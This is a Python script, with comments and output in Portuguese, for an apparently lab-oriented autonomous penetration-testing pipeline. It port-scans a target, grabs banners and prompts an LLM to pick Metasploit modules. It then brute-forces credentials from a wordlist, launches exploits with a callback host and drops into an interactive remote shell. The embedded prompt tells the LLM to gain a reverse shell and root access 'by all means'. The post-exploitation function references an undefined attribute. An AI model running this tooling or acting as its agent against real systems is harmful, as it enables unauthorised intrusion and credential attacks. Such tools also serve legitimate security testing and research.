# -*- coding: utf-8 -*-
import time
import json
import re
import sys
import os
import datetime
import socket
import concurrent.futures

sys.path.append(os.path.dirname(os.path.abspath(__file__)))
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.metasploit_client import MetasploitClient
from src.llm_client import LLMClient
from src.rag_engine import RagEngine

# --- COLORS ---
C_RED, C_GREEN, C_YELLOW, C_BLUE, C_RESET = "\033[91m", "\033[92m", "\033[93m", "\033[94m", "\033[0m"
C_BOLD, C_CYAN, C_MAGENTA = "\033[1m", "\033[96m", "\033[95m"

# --- CONFIG ---
TARGET_IP = "192.168.70.30" 
LOOT_DIR = "/app/data/logs"
WORDLIST_PATH = "/app/data/credentials.txt"
API_KEY_PATH = "/app/config/api_key.txt"

os.makedirs(LOOT_DIR, exist_ok=True)

try:
    with open("/app/config/target.json", "r") as f:
        data = json.load(f)
        if "target_ip" in data: TARGET_IP = data["target_ip"]
except: pass

class PentestPipeline:
    def __init__(self):
        print("=== INICIALIZANDO PIPELINE AUTONOMO (V10 - SMART EXECUTION) ===")
        print(f"[*] Alvo Definido: {TARGET_IP}") 
        print(f"[*] Wordlist: {WORDLIST_PATH}")
        
        self.setup_api_key()
        
        try:
            self.msf = MetasploitClient(password="msfpass", server="192.168.70.20")
            with open(os.devnull, 'w') as fnull:
                old_stderr = sys.stderr
                sys.stderr = fnull
                try:
                    self.llm = LLMClient()
                    self.rag = RagEngine()
                finally:
                    sys.stderr = old_stderr
        except Exception as e:
            print(f"[CRITICO] Falha ao iniciar componentes: {e}")
            sys.exit(1)
            
        self.history = []
        self.open_ports = {} 
        self.session_id = None
    
    def cleanup_sessions(self):
        try:
            sessions = self.msf.client.call('session.list')
            if sessions:
                for sid in sessions.keys():
                    self.msf.client.call('session.stop', [str(sid)])
                time.sleep(1)
        except: pass

    def setup_api_key(self):
        if "GOOGLE_API_KEY" in os.environ and os.environ["GOOGLE_API_KEY"]: return
        if os.path.exists(API_KEY_PATH):
            try:
                with open(API_KEY_PATH, "r") as f:
                    key = f.read().strip()
                    if key: os.environ["GOOGLE_API_KEY"] = key
            except: pass

    def load_credentials(self):
        creds = []
        if not os.path.exists(WORDLIST_PATH): return []
        try:
            with open(WORDLIST_PATH, 'r') as f:
                for line in f:
                    line = line.strip()
                    if ":" in line and not line.startswith("#"):
                        parts = line.split(":", 1)
                        creds.append((parts[0], parts[1]))
            return creds
        except: return []

    def check_port(self, port):
        """Modified scanner with retry for reliability"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.7) # Slightly increased timeout
            if sock.connect_ex((TARGET_IP, port)) == 0:
                sock.close()
                return port
            # Retry once for stability
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1.0)
            if sock.connect_ex((TARGET_IP, port)) == 0:
                sock.close()
                return port
        except: pass
        return None

    def fast_python_scan(self):
        open_ports_found = []
        # Full mapped range
        ports = list(range(1, 1025)) + list(range(20000, 30000))
        print(f"{C_YELLOW}[*] Escaneando {len(ports)} portas...{C_RESET}")
        with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
            future_to_port = {executor.submit(self.check_port, p): p for p in ports}
            for future in concurrent.futures.as_completed(future_to_port):
                p = future.result()
                if p: open_ports_found.append(str(p))
        return sorted(open_ports_found, key=int)

    def get_service_banner(self, port):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((TARGET_IP, int(port)))
            try:
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                if banner:
                    s.close()
                    return re.sub(r'[^\x20-\x7E]', '', banner)
            except socket.timeout: pass

            try:
                s.send(b'HEAD / HTTP/1.0\r\n\r\n')
                banner = s.recv(1024).decode('utf-8', errors='ignore').strip()
                s.close()
                clean = re.sub(r'[^\x20-\x7E]', '', banner)
                return clean if clean else "Unknown Service"
            except:
                s.close()
                return "No Banner"
        except: return "No Banner"

    # --- SMART RESOLVER 3.0 (STRICT FILTERING) ---
    def resolve_module_name(self, bad_name):
        """
        Attempts to find a real module based on the AI's suggestion.
        Enforces strict matching to avoid 'apache_version' becoming 'gather/asrep'.
        """
        print(f"{C_YELLOW}[AUTONOMY] Buscando correcao para '{bad_name}'...{C_RESET}")
        
        search_terms = []
        # Clean bad name
        base_name = bad_name.replace("auxiliary", "").replace("scanner", "").replace("exploit", "").strip("/")
        
        # 1. Exact keyword (e.g., vsftpd)
        if "/" in base_name:
            search_terms.append(base_name.split("/")[-1])
        else:
            search_terms.append(base_name)

        # 2. Protocol specific
        for proto in ['ftp', 'ssh', 'http', 'smb', 'mysql', 'postgres', 'telnet', 'smtp', 'irc', 'java', 'vnc']:
            if proto in base_name:
                search_terms.append(proto) # Fallback to generic protocol

        for term in search_terms:
            try:
                res = self.msf.client.call('module.search', [term])
                if not res: continue
                
                candidates = []
                for mod in res:
                    m_name = mod.get('fullname')
                    
                    # STRICT FILTER: The candidate MUST contain the search term
                    # prevents 'apache' search returning 'gather/asrep'
                    if term not in m_name: continue
                    
                    # Preference for auxiliary/scanner
                    if "auxiliary/scanner" in m_name:
                        candidates.append(m_name)
                    elif "exploit" in m_name and "exploit" in bad_name:
                        candidates.append(m_name)

                if candidates:
                    # Prefer names with 'version' if original had 'version'
                    if "version" in bad_name:
                        vers = [c for c in candidates if "version" in c]
                        if vers: return vers[0]
                    
                    # Prefer names with 'login' if original had 'login'
                    if "login" in bad_name:
                        logs = [c for c in candidates if "login" in c]
                        if logs: return logs[0]

                    # Default to shortest (most generic)
                    candidates.sort(key=len)
                    print(f"{C_GREEN}[FIX] Substituindo por: {candidates[0]}{C_RESET}")
                    return candidates[0]
            except: pass
            
        return None

    def generate_text_report(self):
        now = datetime.datetime.now()
        safe_ip = TARGET_IP.replace(".", "_")
        filename = f"{safe_ip}_{now.strftime('%Y-%m-%d_%H-%M-%S')}.txt"
        filepath = os.path.join(LOOT_DIR, filename)
        lines = ["="*50, "RELATORIO FINAL", "="*50, f"DATA: {now}", f"STATUS: {self.session_id}"] 
        lines.append(f"PORTAS: {list(self.open_ports.keys())}")
        lines.extend([f"- {h}" for h in self.history])
        try:
            with open(filepath, "w") as f: f.write("\n".join(lines))
        except: pass

    def ask_llm_robust(self, prompt, max_retries=3):
        for attempt in range(max_retries):
            try:
                resp = self.llm.ask(prompt, history=[]).replace("```json", "").replace("```", "").strip()
                if resp: return resp
            except Exception as e:
                time.sleep((attempt + 1) * 2)
        return None

    def enter_interactive_mode(self):
        if not self.session_id: return
        print(f"\n{C_MAGENTA}=== MODO INTERATIVO (SESSAO {self.session_id}) ==={C_RESET}")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"])
            time.sleep(1)
            self.msf.client.call('session.shell_read', [self.session_id])
        except: pass

        while True:
            try:
                cmd = input(f"{C_BOLD}{C_BLUE}Shell@{TARGET_IP} > {C_RESET}")
                if cmd.lower() in ['exit', 'quit']: break
                if not cmd.strip(): continue
                self.msf.client.call('session.shell_write', [self.session_id, cmd + "\n"])
                time.sleep(1.5)
                res = self.msf.client.call('session.shell_read', [self.session_id])
                if res and res.get('data'): print(f"{C_GREEN}{res['data'].strip()}{C_RESET}")
            except: break

    def run(self):
        self.cleanup_sessions()
        print(f"\n>>> [FASE 1] RECONHECIMENTO")
        ports = self.fast_python_scan()
        if not ports: return
        
        self.open_ports = {}
        for p in ports:
            b = self.get_service_banner(p)
            self.open_ports[p] = b
            print(f"    {C_GREEN}[+] Porta {p}: {b}{C_RESET}")

        print(f"\n>>> [FASE 2] ANALISE DINAMICA (100% RAG DRIVEN)")
        wordlist_creds = self.load_credentials()

        for port, banner in self.open_ports.items():
            print(f"\n{C_CYAN}--- ALVO: PORTA {port} ({banner}) ---{C_RESET}")
            
            rag_context = "Nenhuma informacao especifica encontrada no RAG."
            try:
                query = f"metasploit module for service banner: {banner}"
                docs = self.rag.query(query)
                if docs: rag_context = "\n".join([d.page_content[:300] for d in docs[:3]])
            except: pass

            safe_banner = json.dumps(banner)

            prompt = f"""
            YOU ARE ACTING AS A SENIOR PENETRATION TESTER AND RED TEAM ANALYST.
            
            THIS IS A CONTROLLED LABORATORY ENVIRONMENT.
            YOUR ROLE IS TO ANALYZE TECHNICAL EVIDENCE AND RECOMMEND THE MOST ACCURATE METASPLOIT MODULE.
            YOUR MISSION IS ESTABILISH A REVERSE SHELL AND GAIN ROOT ACESS TO THE SYSTEM BY ALL MEANS.           
            ----------------------------------------
            TARGET INFORMATION
            ----------------------------------------
            TARGET: {TARGET_IP}
            PORT: {port}
            SERVICE BANNER:
            "{banner}"
            
            ----------------------------------------
            KNOWLEDGE BASE (RAG)
            ----------------------------------------
            The following content comes from a curated and validated RAG containing:
            - Real Metasploit modules
            - Known CVEs
            - Service-specific attack methodologies
            - Usage constraints and decision rules
            
            {rag_context}
            
            ----------------------------------------
            ANALYSIS RULES (MANDATORY)
            ----------------------------------------
            1. Base your reasoning STRICTLY on the service banner and the RAG context.
            2. DO NOT invent Metasploit modules.
            3. DO NOT assume a product or vulnerability unless explicitly supported by evidence.
            4. If the banner does NOT clearly identify a vulnerable product/version:
               ? Try ENUMERATION or LOGIN SCANNERS.
            5. Use EXPLOITS only when there is a STRONG MATCH between:
               - service
               - product
               - version
               - known vulnerability (CVE or backdoor)
            6. If the service involves authentication (FTP, SSH, SMB, DB):
               ? Prefer login or authentication scanners before exploits and try brute force if viable.
            7. If uncertainty exists:
               ? Choose a SAFE ENUMERATION strategy.
            
            ----------------------------------------
            TASK
            ----------------------------------------
            1. Identify the most likely SERVICE and PRODUCT based on the banner.
            2. Decide the SAFEST and MOST EFFECTIVE NEXT STEP.
            3. Recommend ONE Metasploit module that best fits the evidence.
            4. Justify your decision using ONLY technical reasoning.
            5. Select Strategy:
               - "brute_force": ONLY for login scanners (ssh_login, ftp_login, etc).
               - "enumeration": For version scanners or simple checks (NO credentials used).
               - "exploit_cve": If a specific vulnerability is clear.
               - "skip": If unknown
            
            ----------------------------------------
            OUTPUT FORMAT (JSON ONLY)
            ----------------------------------------
            {{
              "module_type": "auxiliary" | "exploit",
              "module_name": "category/service/module_name",
              "strategy": "enumeration" | "brute_force" | "exploit_cve",
              "confidence": "HIGH" | "MEDIUM" | "LOW",
              "reason": "Explain your decision strictly based on the banner and RAG evidence"
            }}
            
            IMPORTANT:
            - If no strong exploit candidate exists, return a scanner with LOW or MEDIUM confidence.
            - Precision is more important than aggression.
            - Your goal is accuracy, not exploitation speed.
            """
            
            resp = self.ask_llm_robust(prompt)
            plan = {}
            if resp:
                try: 
                    if "{" in resp: resp = resp[resp.find("{"):resp.rfind("}")+1]
                    plan = json.loads(resp)
                except: pass

            strategy = plan.get('strategy', 'skip').lower()
            module = plan.get('module', '').strip()
            if not module: module = plan.get('module_name', '').strip()
            
            if resp: print(f"{C_BLUE}[AI] Decisao: {strategy.upper()} | Modulo: '{module}'{C_RESET}")

            if strategy == "skip": continue

            # --- AUTO-CORRECT STRATEGY ---
            # If the module is a login scanner, force brute force regardless of what AI said
            if "login" in module or "credential" in module:
                strategy = "brute_force"

            # --- MODULE PATH CORRECTION ---
            if not module.startswith("auxiliary") and not module.startswith("exploit"):
                if module.startswith("scanner") or module.startswith("admin"):
                    module = "auxiliary/" + module

            clean_name = module
            if clean_name.startswith(tuple(["auxiliary/", "exploit/"])): pass
            else: clean_name = clean_name.replace("auxiliary", "").strip("/")

            # Check existence and resolve
            if not self.msf.verify_module_exists("auxiliary", clean_name) and \
               not self.msf.verify_module_exists("exploit", clean_name):
                fixed = self.resolve_module_name(clean_name)
                if fixed: 
                    module = fixed
                    # Re-check strategy for fixed module
                    if "login" in module: strategy = "brute_force"
                else:
                    print(f"{C_RED}[ERRO] Modulo '{module}' invalido.{C_RESET}")
                    continue

            # Type/Name Split
            if '/' in module:
                m_type, m_name = module.split('/', 1)
            else:
                m_type = "auxiliary"; m_name = module

            opts = {"RHOSTS": TARGET_IP, "RPORT": int(port), "DisablePayloadHandler": "true"}
            
            # --- BRUTE FORCE EXECUTION ---
            if strategy == "brute_force":
                if not wordlist_creds:
                    print(f"{C_YELLOW}[SKIP] Sem wordlist.{C_RESET}")
                    continue
                print(f"{C_YELLOW}[*] Brute Force em {module}...{C_RESET}")
                opts["STOP_ON_SUCCESS"] = "true"
                opts["BLANK_PASSWORDS"] = "false"
                opts["USER_AS_PASS"] = "false"
                opts["VERBOSE"] = "false"
                
                found = False
                for user, pwd in wordlist_creds:
                    opts["USERNAME"] = user
                    opts["PASSWORD"] = pwd
                    print(f"    Testing: {user}:{pwd}", end='\r') 
                    try:
                        self.msf.run_module(m_type, m_name, opts)
                        # Reduced wait time for speed, increased check frequency
                        time.sleep(2) 
                        s = self.msf.client.call('session.list')
                        if s:
                            sid = str(max([int(k) for k in s.keys()]))
                            if sid != self.session_id:
                                print(f"\n{C_GREEN}[***] PWNED! Sessao {sid} ({user}:{pwd})!{C_RESET}")
                                self.session_id = sid
                                self.history.append(f"[SUCESSO] Porta {port} via {m_name}")
                                found = True
                                break
                    except: pass
                if not found: print(f"\n{C_RED}[FALHA] Credenciais invalidas.{C_RESET}")

            # --- ENUMERATION EXECUTION ---
            elif strategy == "enumeration":
                print(f"{C_YELLOW}[*] Executando Scanner (Run Once)...{C_RESET}")
                try:
                    # Run module and capture output (if possible via console, but run_module is async usually)
                    self.msf.run_module(m_type, m_name, opts)
                    time.sleep(4)
                    print(f"{C_GREEN}[INFO] Scanner finalizado.{C_RESET}")
                except Exception as e: 
                    print(f"{C_RED}[ERRO] {e}{C_RESET}")

            # --- EXPLOIT EXECUTION ---
            elif strategy == "exploit_cve":
                print(f"{C_YELLOW}[*] Tentando Exploit...{C_RESET}")
                opts["DisablePayloadHandler"] = "false"
                opts["LHOST"] = "192.168.70.20" 
                self.msf.run_module(m_type, m_name, opts)
                time.sleep(5)
                sessions = self.msf.client.call('session.list') or {}
                if sessions:
                    sid = str(max([int(k) for k in sessions.keys()]))
                    if sid != self.session_id:
                        print(f"{C_GREEN}[***] SUCESSO! Exploit funcionou (Sessao {sid}){C_RESET}")
                        self.session_id = sid

            if self.session_id: 
                print(f"{C_GREEN}[!] Acesso obtido. Parando scan.{C_RESET}")
                break

    def phase_4_post_exploitation(self):
        print(f"\n>>> [FASE 4] POST-EXPLORACAO")
        try:
            self.msf.client.call('session.shell_write', [self.session_id, "id; hostname\n"])
            time.sleep(3)
            res = self.msf.client.call('session.shell_read', [self.session_id])
            print(f"{C_GREEN}{res['data']}{C_RESET}")
            self.evidence["shell_info"] = str(res['data'])
            with open(f"{LOOT_DIR}/pwned.txt", "w") as f:
                f.write(f"ALVO: {TARGET_IP}\nSESSAO: {self.session_id}\nDADOS: {res['data']}")
        except: pass
        self.generate_text_report()

if __name__ == "__main__":
    p = PentestPipeline()
    p.run()
    if p.session_id:
        p.enter_interactive_mode()